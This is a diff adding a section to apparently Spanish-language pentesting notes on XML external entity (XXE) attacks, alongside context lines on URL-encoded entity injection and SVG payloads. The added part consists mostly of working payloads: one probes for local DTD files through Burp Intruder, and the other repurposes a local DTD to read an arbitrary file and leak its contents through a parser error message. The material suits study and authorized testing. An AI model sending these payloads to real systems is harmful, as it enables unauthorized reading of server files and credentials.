@@ -161,6 +161,30 @@ productId=%26entity%3b&storeId=1 ---> Entidad declarada y url-encodeada
 </svg>
 ```
 -- -
+# XXE by repurposing local DTD 
+### Testing
+- Buscamos donde esta el local dtd en el sistema enviando este codigo xml como body al intruder
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY % myFile SYSTEM "file://LIST_WITH_LOCAL_DTD"> 
+%myFile;]>
+```
+
+```xml 
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///LOCAL_DTD">
+
+    <!ENTITY % expr 'aaa)>
+        <!ENTITY &#x25; file SYSTEM "file:///FILE_TO_READ">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa (bb'>
+
+    %local_dtd;
+
+```
+---
 ## Aclaraciones:
 - Siempre hay que "invocar" el nombre de la entidad dentro de la estructura XML para asi ejecutar el payload. (&myFile dentro de algun tag). 
 - Siempre si no funciona probar sacar el %.
